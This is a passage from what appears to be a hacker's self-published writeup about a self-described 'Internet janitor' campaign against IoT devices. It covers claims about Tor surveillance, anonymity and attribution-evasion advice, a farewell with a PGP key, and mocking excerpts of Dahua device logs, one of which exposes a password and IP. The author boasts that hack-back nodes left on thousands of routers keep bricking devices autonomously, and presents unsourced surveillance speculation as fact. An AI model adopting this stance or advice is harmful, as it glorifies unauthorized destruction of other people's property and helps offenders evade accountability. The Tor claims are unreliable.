+knowledge at least yet. Read what I have to say very carefully.
+
+
+--[ 6.3.1 - Observations and deductions about the Tor network
+
+Here are my basic observations and deductions about the Tor network:
+
+* Hundreds of exit nodes are controlled by a single entity that has the 
+  ability to monitor all the outbound traffic. My own mapping efforts
+  caught web traffic interception from 329 unique exit node IPs (and 
+  these interceptions were connected by a common fingerprint). It goes
+  without saying that an exit node-running entity of this size must be 
+  well-funded (and one might guess who that entity is based on the fact 
+  that the Tor project itself receives most of its funding from the US 
+  government).
+
+* It should therefore be considered highly probable that an equally 
+  large number of entry and middle nodes are also controlled by the same 
+  entity. With a default Tor configuration your Tor traffic and DNS are 
+  likely to be monitored by someone who is in a position to deanonymize 
+  and track you.
+  
+* The Tor FAQ at https://www.torproject.org/docs/faq.html.en is probably 
+  accurate (in a legalistic sense) regarding Tor's capabilities. To 
+  translate the FAQ into real English you should nonetheless interpret 
+  every part which says 'Tor does not protect you against this scenario' 
+  as 'the spooks who fund us are tracking you because of this.'
+  
+* A large number of Tor exit nodes will periodically try to MITM ssh 
+  connections. It's clear that even these MITM attempts are controlled 
+  by a single entity since the MITM daemons are using shared fake host 
+  keys. The most common of these MITM ssh daemon host keys is 
+  e7:0e:73:a5:88:23:67:9c:01:87:3c:61:96:f6:e8:0a. The decision to
+  use a shared host key for multiple exit node interceptions seems 
+  weirdly amateurish, but perhaps the interception attempts are simply 
+  tunneled via a single MITM daemon (legacy capture systems etc).
+
+
+--[ 6.3.2 - Essential mitigations for using Tor
+
+I would not personally use Tor for anything high-risk without taking into 
+account at least the following factors and mitigations:
+
+* Since it's likely that your default entry and exit nodes (and probably
+  even the middle nodes) are controlled by a single government-connected 
+  entity you'll never want to connect into Tor from an IP which can be 
+  trivially linked to you or your location. At the very least you should
+  consider setting up a private server as a Tor bridge: 
+  
+  https://www.torproject.org/docs/bridges#RunningABridge
+
+  Personally I opted for tunneling my outbound entry traffic through a 
+  country with excellent privacy and surveillance laws but masking your 
+  real IP in this way is not technically or logistically trivial 
+  (correlation attacks are the primary risk).
+ 
+* You should beware of sending or receiving large amounts of data at 
+  once through the network as these kinds of spikes will set you up for 
+  correlation attacks. Understand how to throttle bandwidth and remember 
+  to build safeguards into all your systems to prevent processes from 
+  running amok and causing bandwidth spikes. Many IoT devices may (even
+  in regular operation) suddenly decide to push hundreds of thousands of 
+  lines of debug data through your connection.
+
+* For server applications use you should dedicate a system for Tor 
+  use and not try to do anything else with it (such as host a public 
+  web server or any other WAN service for that matter). Avoid creating
+  DNS lookup dependencies. If you think you need DNS for typical IoT 
+  bricking scenarios then you're doing something wrong.
+  
+* For safe browsing you should consider using a hardened OS such as 
+  Tails. I take a dim view of black box magic anonymity routers. Dedicate 
+  a system or VM for browsing with Tor and NEVER mix activities that you 
+  would carry out on your regular desktop with whatever you may be
+  doing on your Tor desktop. Segmentation is critically important. Tails 
+  lets you add your private Tor bridge (or a proxy tunnel) as your Tor 
+  entry in the startup through 'Additional Settings', 'Network 
+  Connection' and 'Configure a Tor bridge or a local proxy'. If you use
+  Tails for something that you don't want our government knowing about 
+  then you should never boot it up with its default direct connection 
+  settings.
+
+* Although I will add a separate section about OpSec in my final collated
+  whitepaper I'm going to briefly state that OpSec is not something you 
+  can bolt on later when you think you need it. Much of the traffic on 
+  the Internet is logged and archived for searching. Well-funded 
+  adversaries can go back and trace your string signatures and other 
+  activities from years ago. OpSec is a lifestyle and it should be 
+  instinctive. If you're audacious enough to believe that you can fix 
+  problems on the Internet then it pays to go through the extra effort 
+  from day 1.
+  
+
+--[ 7 - My last experiment
+
+My last experiment will be to find an answer to an obvious question: Will 
+I get away with what I did? (All in the name of empirical research, 
+right?)
+
+As I said in the introduction of this part I switched off my last 
+remaining C2 on July 1st 2018. I've left hack-back nodes running on a few 
+thousand routers and these should keep cleaning/bricking devices 
+autonomously for at least a few more weeks. I'll focus on bringing 
+together my disparate writeups into a single whitepaper next but that'll 
+then probably be it for me. 
+
+I'm not the only Internet janitor around so it'll be up to the others 
+to keep the good fight going. Best of luck. It has been an honor to work 
+alongside you and I'm sorry I have to bail out. There will always be new 
+ones, and in many ways our work has only just begun.
+
+Just in case I some day need to prove I'm still alive (or who I was) I'm
+including a public key:
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+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
+=FPUZ
+-----END PGP PUBLIC KEY BLOCK-----
+
+Who knows, maybe there will be a new mission with my name on it in the 
+future?
+
+My last experiment reminds me of a joke:
+
+  The phone rings at FBI headquarters.
+
+  "Hello?"
+  "Hello, is this FBI?"
+  "Yes. What do you want?"
+  "I'm calling to report my neighbor Tom. He is hiding marijuana in his 
+   firewood."
+  "This will be noted."
+
+  Next day, the FBI comes over to Tom's house. They search the shed where 
+  the firewood is kept, break every piece of wood, find no marijuana, 
+  swear at Tom and leave.
+
+  The phone rings at Tom's house.
+
+  "Hey, Tom! Did the FBI come?"
+  "Yeah!"
+  "Did they chop your firewood?"
+  "Yeah they did."
+  "Okay, now it's your turn to call. I need my garden plowed."
+
+
+--[ 8 - Bonus Section: Dahua's Comedy of ERRORs
+
+Reading system logs doesn't only give you an idea of the state of a 
+system but they also give you an understanding of the developer's level 
+of professionalism. Carefully developed and refined systems provide 
+useful and helpful information about what's going on in their system 
+logs. Crapware hacked together quickly by developers who never cared 
+about the quality of the end-result tends to do the very opposite.
+
+The Dahua control interface (typically listening on port 6789 but 
+sometimes on port 19058) is perhaps the most prolific spewer of 
+nonsensical system log output ever built. It's a beautiful window into
+the minds of the programming dilettantes who created this well-known IoT 
+security wreck. Dahua's developers seem completely oblivious of basic 
+system programming concepts such as state hysteresis and message 
+throttling. That the system log output should be user-comprehendible also 
+doesn't seem to have occured to anyone at Dahua HQ.
+
+Even in regular operation you can see useless repetitive scroll such
+as this (note the timestamps):
+
+  20:58:00|trace CVFDCommandTimeLed::setParam>>20:58:0
+  20:58:00|trace Ntp Server receive request from:::ffff:5.8.88.8
+  20:58:00|trace Ntp Server response
+  20:58:00|trace Ntp Server receive request from:::ffff:5.8.88.8
+  20:58:00|trace Ntp Server response
+  20:58:00|trace Ntp Server receive request from:::ffff:5.8.88.8
+  20:58:00|trace Ntp Server response
+  20:58:00|trace Ntp Server receive request from:::ffff:5.8.88.8
+  20:58:00|trace Ntp Server response
+  20:58:01|trace Ntp Server receive request from:::ffff:5.8.88.8
+  20:58:01|trace Ntp Server response
+  20:58:01|trace Ntp Server receive request from:::ffff:5.8.88.8
+  20:58:01|trace Ntp Server response
+  20:58:01|trace Ntp Server receive request from:::ffff:5.8.88.8
+  20:58:01|trace Ntp Server response
+  20:58:01|trace Ntp Server receive request from:::ffff:5.8.88.8
+  20:58:01|trace Ntp Server response
+  20:58:02|trace Ntp Server receive request from:::ffff:5.8.88.8
+  20:58:02|trace Ntp Server response
+  20:58:02|trace Ntp Server receive request from:::ffff:5.8.88.8
+  20:58:02|trace Ntp Server response
+  20:58:02|trace Ntp Server receive request from:::ffff:5.8.88.8
+  20:58:02|trace Ntp Server response
+
+  18:19:14|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:15|trace Failed:Account has been locked
+  18:19:16|trace Failed:Account has been locked
+  18:19:16|trace Failed:Account has been locked
+  18:19:16|trace Failed:Account has been locked
+  18:19:16|trace Failed:Account has been locked
+  18:19:16|trace Failed:Account has been locked
+  18:19:16|trace Failed:Account has been locked
+  18:19:16|trace Failed:Account has been locked
+  18:19:16|trace Failed:Account has been locked
+
+Dahua's system log output becomes particularly revealing when things
+start going wrong on a system (such as when device partitions are 
+being overwritten with random garbage). The cacophony of hysterical 
+alerts from malfunctioning subsystems escalates into a stream of opaque 
+nonsense that almost becomes an artform in itself.
+
+In this vein I'll attempt to create a gallery of system log art
+courtesy of Dahua. The snippets below are actual unedited Dahua system 
+log messages (along with my commentary in parentheses):
+
+  dvr_upnp_tv_ctrlpt_main 275 UPNP router is not on line
+  dvr_upnp_tv_ctrlpt_main 275 UPNP router is not on line
+  dvr_upnp_tv_ctrlpt_main 275 UPNP router is not on line
+  dvr_upnp_tv_ctrlpt_main 275 UPNP router is not on line
+  dvr_upnp_tv_ctrlpt_main 275 UPNP router is not on line
+  dvr_upnp_tv_ctrlpt_main 275 UPNP router is not on line
+  dvr_upnp_tv_ctrlpt_main 275 UPNP router is not on line
+  dvr_upnp_tv_ctrlpt_main 275 UPNP router is not on line
+  dvr_upnp_tv_ctrlpt_main 275 UPNP router is not on line
+  dvr_upnp_tv_ctrlpt_main 275 UPNP router is not on line
+  dvr_upnp_tv_ctrlpt_main 275 UPNP router is Segmentation fault
+  Segmentation fault
+  Segmentation fault
+  Segmentation fault
+  Segmentation fault
+  Segmentation fault
+  Segmentation fault
+  Segmentation fault
+  Segmentation fault
+  Segmentation fault
+  Segmentation fault
+  Segmentation fault
+  Segmentation fault
+  
+(I bet 'UPNP router' didn't see that one coming!)  
+
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+  dial ip is not success!
+
+(If at first dial ip is not success, then try, try, try again 7 times per 
+ second)
+
+  DHFS: GET_DIR_ITEM(0 1885850874) total:59614 failed line:180!!!!!!!!!!!!
+  DHFS: GET_DIR_ITEM(0 1885850874) total:59614 failed line:180!!!!!!!!!!!!
+  DHFS: GET_DIR_ITEM(0 1885850874) total:59614 failed line:180!!!!!!!!!!!!
+  DHFS: GET_DIR_ITEM(0 1885850874) total:59614 failed line:180!!!!!!!!!!!!
+  DHFS: GET_DIR_ITEM(0 1885850874) total:59614 failed line:180!!!!!!!!!!!!
+  DHFS: GET_DIR_ITEM(0 1885850874) total:59614 failed line:180!!!!!!!!!!!!
+  16:57:44|trace ReadFile failed !!!!!!!!!!!!!
+  16:57:47|trace ReadFile failed !!!!!!!!!!!!!
+  DHFS: No such driver!
+  DHFS: No such driver!
+  DHFS: No such driver!
+  DHFS: No such driver!
+  16:57:50|trace ReadFile failed !!!!!!!!!!!!!
+  16:57:56|trace ReadFile failed !!!!!!!!!!!!!
+  16:57:59|trace ReadFile failed !!!!!!!!!!!!!
+  16:58:02|trace ReadFile failed !!!!!!!!!!!!!
+  16:58:05|trace ReadFile failed !!!!!!!!!!!!!
+  16:58:08|trace ReadFile failed !!!!!!!!!!!!!
+  16:58:11|trace ReadFile failed !!!!!!!!!!!!!
+
+(For Dahua's programmers the gravity of the error condition appears to be
+ signified by the number of exclamation points)
+
+  04:54:29|error RPCServer login failed username:ADMINISTRATOR password:000000 address:177.54.151.122
+  04:54:29|error login error!!!!!!!!!!!!!!!!!!!!!!!
+  04:54:29|error socket disconnected
+  04:54:29|error CRPCMsgStream::recv error!
+  04:54:29|error RPCServer login failed username:ADMINISTRATOR password:000000 address:177.54.151.122
+  04:54:29|error login error!!!!!!!!!!!!!!!!!!!!!!!
+  04:54:29|error socket disconnected
+  04:54:29|error CRPCMsgStream::recv error!
+  04:54:29|error RPCServer login failed username:ADMINISTRATOR password:000000 address:177.54.151.122
+  04:54:29|error login error!!!!!!!!!!!!!!!!!!!!!!!
+  04:54:29|error socket disconnected
+  
+(This password-leaking login error is accompanied by a total of 23 
+ exclamation points, apparently making it the world's most serious 
+ problem)
+
+  01:28:00|trace CDHFile::Write() read old data
+  01:28:00|trace CDHFile::Write() read old data
+  01:28:00|trace CDHFile::Write() read old data
+  01:28:00|trace CVFDCommandTimeLed::setParam>>1:27:0
+  01:28:00|trace CDHFile::Write() read old data
+  01:28:00|trace CDHFile::Write() read old data
+  [LIBDVR] MSG: /dev/sda wakeup
+  [LIBDVR] MSG: 2017-3-12, weekday:0 time:1:27:58
+  CVFDCommandTimeLed::setParam>>1:28:0
+  01:28:16|trace CNetWorkService::onConnTimer-----------------
+  01:28:17|trace libkeyboard.a::KeepAlive ff a 0 0!
+  reg   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@new client!
+  add$$$$$$$$connect count is 1 (func = VideoSetCoverCmd line =>2759): vo:-1 Not support now
+  add$$$$$$$$connect count is send error
+  send error
+  [N5X libvos]  WARN  (func = VideoSetCoverCmd line =>2759): vo:-1 Not support now
+  [N5X libvos]  WARN  (func = VideoSetCoverCmd line =>2759): vo:-1 Not support now
+  [N5X libvos]  WARN  (func = VideoSetCoverCmd line =>2759): vo:-1 Not support now
+
+(Perhaps the needless repetition of characters such as @@@@@ or $$$$$
+ should also become 'not support now'? And what's the design logic behind 
+ a function called Write() reporting 'read old data'?)
+
+  libplay.a FDMAMemcpy() 3297 bug!!!:
+  copy len is 0
+  libplay.a FDMAMemcpy() 3297 bug!!!:
+  copy len is 0
+  libplay.a FDMAMemcpy() 3297 bug!!!:
+  copy len is 0
+  libplay.a FDMAMemcpy() 3297 bug!!!:
+  copy len is 0
+  libplay.a FDMAMemcpy() 3297 bug!!!:
+  copy len is 0
+  libplay.a FDMAMemcpy() 3297 bug!!!:
+  copy len is 0
+
+('3297 bug!!! 3297 bug!!!' would make for a catchy chorus for Dahua's 
+ next ad jingle)
+
+  13:52:59|warn  Throwing GOP[15]!
+  13:52:59|warn  Throwing GOP[15]!
+  13:52:59|warn  Throwing GOP[15]!
+  13:52:59|warn  Throwing GOP[30]!
+  13:52:59|warn  Throwing GOP[30]!
+  13:52:59|warn  Throwing GOP[15]!
+  13:53:00|warn  Throwing GOP[30]!
+  13:53:00|warn  Throwing GOP[30]!
+  13:53:00|warn  Throwing GOP[15]!
+  13:53:00|warn  Throwing GOP[15]!
+  13:53:00|warn  Throwing GOP[15]!
+  13:53:00|warn  Throwing GOP[30]!
+  13:53:00|warn  Throwing GOP[30]!
+  13:53:00|warn  Throwing GOP[15]!
+  13:53:00|warn  Throwing GOP[30]!
+  13:53:00|warn  Throwing GOP[30]!
+  
+(Watch where ya throwing them GOPs, bucko!!!)
+
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  !
+  ------------------------
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  ...skipping one line
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+  14:SQLITE_CANTOPEN[14]: unable to open database file
+
+(I like how the Dahua system log is able to determine that it can safely 
+ skip one line of useless information in the midst of a deluge of log
+ spam)
+ 
+  09:29:05|trace NetApp>>>>>>>>>>>GetWifiNetState wifi no enable
+  09:29:06|trace m_iWifiMuduleExist,ret:0,-1
+  09:29:06|trace NetApp>>>>>>>>>>>GetWifiNetState wifi no enable
+  [LIBDVR] MSG: 2017-9-14, weekday:4 time:14:42:47
+  09:29:07|trace NetApp>>>>>>>>>>>GetWifiNetState wifi no enable
+  09:29:08|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:08|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:08|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:08|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:08|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:08|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:08|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:08|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:08|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:09|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:09|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:09|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:09|trace ==================>O P HERE 547  DefaultIFrameNum:10
+  09:29:09|trace ==================>O P HERE 547  DefaultIFrameNum:10
+
+(Here some 'Mudule' was having a bad day which resulted in the log file 
+ being filled with an endless stream of what looks like ASCII penis art)
+
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+  [LIBDVR] MSG: get bond config failed, set it to 0
+
+(My name is bond, config bond)
+
+  23:52:44|trace EventsHandleProc error@@@@@@
+  23:52:44|trace EventsHandleProc error@@@@@@
+  23:52:44|trace EventsHandleProc error@@@@@@
+  23:52:45|trace EventsHandleProc error@@@@@@
+  23:52:45|trace EventsHandleProc error@@@@@@
+  23:52:45|trace EventsHandleProc error@@@@@@
+  23:52:45|trace EventsHandleProc error@@@@@@
+  23:52:45|trace EventsHandleProc error@@@@@@
+  23:52:46|trace EventsHandleProc error@@@@@@
+  23:52:46|trace EventsHandleProc error@@@@@@
+  23:52:46|trace EventsHandleProc error@@@@@@
+  23:52:46|trace EventsHandleProc error@@@@@@
+  23:52:46|trace EventsHandleProc error@@@@@@
+  23:52:47|trace EventsHandleProc error@@@@@@
+  23:52:47|trace EventsHandleProc error@@@@@@
+  23:52:47|trace EventsHandleProc error@@@@@@
+  23:52:47|trace EventsHandleProc error@@@@@@
+  23:52:47|trace EventsHandleProc error@@@@@@
+
+(The least useful log message of the year award goes to... Dahua)
+
+  19:08:38|error data arrive,cannot deal with it now!!
+  read_conf:181 Open /etc/resolv.conf failed:Input/output error!
+  read_conf:181 Open /etc/resolv.conf failed:Input/output error!
+  gai_strerror:173 Parser error!
+  19:08:39|trace ::getaddrinfo error: host
+  name = www.peoplefu.com, server = 80 ,errno = -2, detail = Name or service not known
+  read_conf:181 Open /etc/resolv.conf failed:Input/output error!
+  read_conf:181 Open /etc/resolv.conf failed:Input/output error!
+  gai_strerror:173 Parser error!
+
+(Dealing with data is too difficult right now, let's trigger a 'gai 
+ strerror' instead..)
+
+  [N5X libhicap] ERROR (Ai_SendAoStream
+  |8644): HI_MPI_AO_SendFrame failed 0xa0168003
+   *** Beging RAInitResamplerRat ***
+   *** Beging RAInitResamplerRat ***
+   *** Beging RAInitResamplerRat ***
+   *** Beging RAInitResamplerRat ***
+   *** Beging RAInitResamplerRat ***
+   *** Beging RAInitResamplerRat ***
+   *** Beging RAInitResamplerRat ***
+   *** Beging RAInitResamplerRat ***
+   *** Beging RAInitResamplerRat ***
+
+(You know a Dahua device has fallen on hard times when it resorts to 
+ begging Resampler Rat for assistance)
+
+  23:03:48|trace >>>>>>>>>>>>>error  can not find "DHAV"
+  23:03:48|trace >>>>>>>>>>>>>error  can not find "DHAV"
+  23:03:49|trace >>>>>>>>>>>>>error  can not find "DHAV"
+  23:03:49|trace >>>>>>>>>>>>>error  can not find "DHAV"
+  23:03:49|trace 	  dwPreFrameLeft = dwPreFrameLength  dwPreFrameLeft:0x716cb  err!!
+  23:03:49|trace >>>>>>>>>>>>>error  can not find "DHAV"
+  23:03:49|trace >>>>>>>>>>>>>error  can not find "DHAV"
+  23:03:50|trace >>>>>>>>>>>>>error  can not find "DHAV"
+  23:03:50|trace >>>>>>>>>>>>>error  can not find "DHAV"
+  23:03:50|trace >>>>>>>>>>>>>error  can not find "DHAV"
+  23:03:50|trace >>>>>>>>>>>>>error  can not find "DHAV"
+
+(But what have you done for DHAV lately? Maybe DHAV doesn't want to be 
+ found?)
+
+  07:35:27|error Src/RPCMsgStream.cpp: 349, magic error!!
+  07:35:27|error data arrive,cannot deal with it now!!
+  07:35:32|error socket disconnected
+  07:35:32|error CRP 
+  07:35:36|error socket disconnected
+  07:35:40|error socket disconnected
+  07:35:40|error CRPCMsgStream::recv error!
+  07:35:40|warn  RpcLog Src/RPCPacket.cpp:378<SetValidDataLen> magic error,S Src/RPCMsgStream.cpp: 349, magic error!!
+  07:35:40|error data arrive,cannot deal with it now!!
+  07:35:45|error socket disconnected
+  07:35:45|error CRPCMsgStream::recv error!
+  cat : Write Error: No space left on device
+  cat : Write Error: No space left on device
+  send error
+  cat : Write Error: No space left on device
+  [SYSNET-1741] ERR (config.c|NetWorkGetFromCmos|222): ReadCmosData failed
+  [SYSNET-1741] ERR (config.r Src/RPCMsgStream.cpp: 349, magic error!!
+
+(Oh noes.. Not the magic error!!)
+
+  libplay.a DecoderGetDspInfo() 2305 err!!!: ERROR ---UNSPPORT STARM!!
+  libplay.a DecoderGetDspInfo() 2305 err!!!: ERROR ---UNSPPORT STARM!!
+  libplay.a DecoderGetDspInfo() 2305 err!!!: ERROR ---UNSPPORT STARM!!
+  libplay.a DecoderGetDspInfo() 2305 err!!!: ERROR ---UNSPPORT STARM!!
+  libplay.a DecoderGetDspInfo() 2305 err!!!: ERROR ---UNSPPORT STARM!!
+  libplay.a DecoderGetDspInfo() 2305 err!!!: ERROR ---UNSPPORT STARM!!
+  libplay.a DecoderGetDspInfo() 2305 err!!!: ERROR ---UNSPPORT STARM!!
+  14:36:26|warn  Src/Protocol/StreamSeparatorRtp.cpp:190 rtp over rtsp stream error 
+  14:36:26|warn  Src/Protocol/StreamSeparatorRtp.cpp:190 rtp over rtsp stream error 
+  libplay.a DecoderGetDspInfo() 2305 err!!!: ERROR ---UNSPPORT STARM!!
+  libplay.a DecoderGetDspInfo() 2305 err!!!: ERROR ---UNSPPORT STARM!!
+  14:36:30|warn  Src/Protocol/StreamSeparatorRtp.cpp:190 rtp over rtsp stream error libplay.a DecoderGetDspInfo() 2305 err!!!:
+  libplay.a DecoderGetDspInfo() 2305 err!!!: ERROR ---UNSPPORT STARM!!
+  libplay.a DecoderGetDspInfo() 2305 err!!!: ERROR ---UNSPPORT STARM!!
+
+(There's no ERROR like an UNSPPORT STARM ERROR) 
+
+  <Status errorcode="400">ERROR</Status>
+  <Status errorcode="440">Timeout Event in RGM_PU</Status>
+  <Status errorcode="440">Timeout Event in RGM_PU</Status>
+  <Status errorcode="400">ERROR</Status>
+  <Status errorcode="400">ERROR</Status>
+  <Status errorcode="400">ERROR</Status>
+  <Status errorcode="400">ERROR</Status>
+  / $ cat : Write Error: No space left on device
+  cat : Write Error: No space left on device
+  / $  cat : Write Error: No space left on device
+  cat : Write Error: No space left on device
+  cat : Write Error: No space left on device
+  <Status errorcode="200">OK</Status>
+  cat : Write Error: No space left on device
+  <Status errorcode="200">OK</Status>
+  cat : Write Error: No space left on device
+  <Status errorcode="200">OK</Status>
+  <Status errorcode="200">OK</Status>
+  <Status errorcode="200">OK</Status>
+  <Status errorcode="200">OK</Status>
+
+(In a moment of lucid transcendence this Dahua unit realized that it 
+ had finally reached an OK state after bricking completed)
+
